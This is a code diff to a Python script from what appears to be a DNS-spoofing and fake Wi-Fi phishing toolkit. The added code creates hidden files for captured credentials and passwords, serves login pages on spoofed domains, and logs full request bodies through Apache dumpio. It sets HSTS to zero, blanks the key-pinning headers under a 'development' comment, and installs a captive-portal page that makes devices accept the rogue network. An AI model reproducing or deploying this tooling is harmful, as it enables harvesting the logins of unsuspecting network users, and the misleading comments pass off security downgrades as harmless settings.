@@ -8,10 +8,19 @@ import sys
 import shutil
 import time
 from zipfile import ZipFile
-value = """RewriteCond %{HTTP_HOST}^(www\\.)?([^\\.]+)\\.local$ [NC]"""
+Path_St = str("/".join(os.path.dirname(__file__).split('/')[:-1]))+'/Snake_Package/ServerLog/'
 Curent_dir2  ="".join(os.path.dirname(__file__)).replace("Snake_Package",'')
 LOG_PATH = str("/".join(os.path.dirname(__file__).split('/')[:-1]))+"/Snake_Package"
 user_name   = os.path.dirname(os.path.abspath(__file__)).split ("/")[2]
+with open(Path_St+'.web.txt','w') as file:
+    group1  = "chown "+ user_name+ ":"+user_name +" "+  Path_St+".web.txt"
+    os.system(group1)
+with open (Path_St+'.Cread.txt','w') as Cread_User :
+    group2  = "chown "+ user_name+ ":"+user_name +" "+  Path_St+".Cread.txt"
+    os.system(group2)
+with open (Path_St+'.pass.txt','w') as Cread_User :
+    group3  = "chown "+ user_name+ ":"+user_name +" "+  Path_St+".pass.txt"
+    os.system(group3)    
 def Set_Log():             
     subprocess.call(["chmod +x "+Curent_dir2+"Snake_Package/ServerLog/SERVER_DNS_STREAM.py"],shell=True)
     subprocess.call(["chmod +x "+Curent_dir2+"Snake_Package/ServerLog/DNS_SPOOFING_LOG.py"],shell=True)
@@ -64,12 +73,14 @@ class DNS_Spoofing:
                 os.system("sudo a2enmod ssl > /dev/null 2>&1")                     
                 os.system("sudo a2dissite 000-default.conf >/dev/null 2>&1")
                 os.system("sudo a2enmod rewrite >/dev/null 2>&1")
+                os.system("sudo a2enmod headers >/dev/null 2>&1")
                 os.system("systemctl restart apache2 >/dev/null 2>&1")
                 if os.system("sudo apache2ctl configtest >/dev/null 2>&1") == 0 :
                     print("[+] DNS has been Start")
                     print("[+] Apache2 Configuration Test  Syntax OK")
                 else:
-                    print("Apache Configtest Get Error") 
+                    print("[+] Apache Configtest Get Error") 
+                    print("[+] Run : journalctl -xeu apache2.service") 
                     exit()  
 
             except FileExistsError as r  :
@@ -94,9 +105,19 @@ class DNS_Spoofing:
                                     ServerAlias {file}.com
                                     ServerAlias www.{file}.com
 
+                                    RewriteEngine On
                                     DocumentRoot /var/www/html/{file}
-                                    ErrorLog {LOG_PATH}/ServerLog/log_error.log
+                                    ErrorLog {LOG_PATH}/ServerLog/log_error.log 
                                     CustomLog {LOG_PATH}/ServerLog/log_access.log combined
+                                    # Bypass security headers that might interfere with development
+                                    Header always set Public-Key-Pins ""
+                                    Header always set Expect-CT ""
+                                    
+                                    # Development-only headers
+                                    Header always set X-Development-Mode "1"
+                                    Header set Strict-Transport-Security "max-age=0; includeSubDomains; preload" env=HTTPS
+                                    SSLProtocol all -SSLv3
+                                    SSLCipherSuite HIGH:!aNULL:!MD5
                                     <IfModule dir_module>
                                             DirectoryIndex login.html index.html index.php
                                     </IfModule>
@@ -107,6 +128,10 @@ class DNS_Spoofing:
                                             RewriteCond %{{HTTP_HOST}} !^www\\.{file}\\.wifi$ [NC]
                                              RewriteRule ^(.*)$ http://www.{file}.wifi/$1 [L,R=301]
                                     </IfModule>
+                                 
+                                    DumpIOInput on
+                                    DumpIOOutput on
+                                    LogLevel dumpio:trace7
 
                                     <Directory /var/www/html/{file}>
                                         Options FollowSymLinks
@@ -125,8 +150,17 @@ class DNS_Spoofing:
 
                                     DocumentRoot /var/www/html/{file}
                                     SSLEngine on
-                                    SSLCertificateFile {LOG_PATH}/SSLCertificateFile/wildcard.crt
-                                    SSLCertificateKeyFile {LOG_PATH}/SSLCertificateFile/wildcard.key
+                                    SSLCertificateFile {LOG_PATH}/SSLCertificateFile/server-combined.pem
+                                    SSLCertificateKeyFile {LOG_PATH}/SSLCertificateFile/server-combined.pem
+                                    # Bypass security headers that might interfere with development
+                                    Header always set Public-Key-Pins ""
+                                    Header always set Expect-CT ""
+                                    
+                                    # Development-only headers
+                                    Header always set X-Development-Mode "1"
+                                    Header set Strict-Transport-Security "max-age=0; includeSubDomains; preload" env=HTTPS
+                                    SSLProtocol all -SSLv3
+                                    SSLCipherSuite HIGH:!aNULL:!MD5
 
                                     ErrorLog {LOG_PATH}/ServerLog/log_error_ssl.log
                                     CustomLog {LOG_PATH}/ServerLog/log_access_ssl.log combined
@@ -140,7 +174,9 @@ class DNS_Spoofing:
                                         RewriteCond %{{HTTP_HOST}} !^www\\.{file}\\.wifi$ [NC]
                                         RewriteRule ^(.*)$ http://www.{file}.wifi/$1 [L,R=301]
                                     </IfModule>
-
+                                    DumpIOInput on
+                                    DumpIOOutput on
+                                    LogLevel dumpio:trace7
                                     <Directory /var/www/html/{file}>
                                         Options FollowSymLinks
                                         AllowOverride None
@@ -177,6 +213,13 @@ class DNS_Spoofing:
                     print("[+] Hosts dns resolve Name has be Created")
                  
         def unzip_web(self):
+            os.system('sudo mkdir /var/www/html/wifi-notification')
+            shutil.copy(LOG_PATH+'/resources/index.html', '/var/www/html/wifi-notification/')
+            shutil.copy(LOG_PATH+'/resources/apple-success.html', '/var/www/html/wifi-notification/')
+            shutil.copy(LOG_PATH+'/resources/wifi-notification.conf', '/etc/apache2/sites-available/')
+            os.system("sudo touch /var/www/html/wifi-notification/generate_204")
+            os.system('sudo chown -R www-data:www-data /var/www/html/wifi-notification')
+            os.system('sudo chmod -R 755 /var/www/html/wifi-notification')
             if os.path.exists(Curent_dir2+'Snake_Package/sites'):
                Set_Log()
             else:     
